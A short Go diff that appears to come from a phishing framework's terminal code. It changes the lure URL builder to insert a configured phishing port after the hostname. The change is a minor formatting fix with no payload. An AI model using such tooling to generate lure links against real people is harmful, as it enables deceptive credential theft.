@@ -716,7 +716,7 @@ func (t *Terminal) handleLures(args []string) error {
 
 				var base_url string
 				if l.Hostname != "" {
-					base_url = "https://" + l.Hostname + l.Path
+					base_url = "https://" + l.Hostname + t.cfg.GetPhishUrlPort() + l.Path
 				} else {
 					purl, err := pl.GetLureUrl(l.Path)
 					if err != nil {
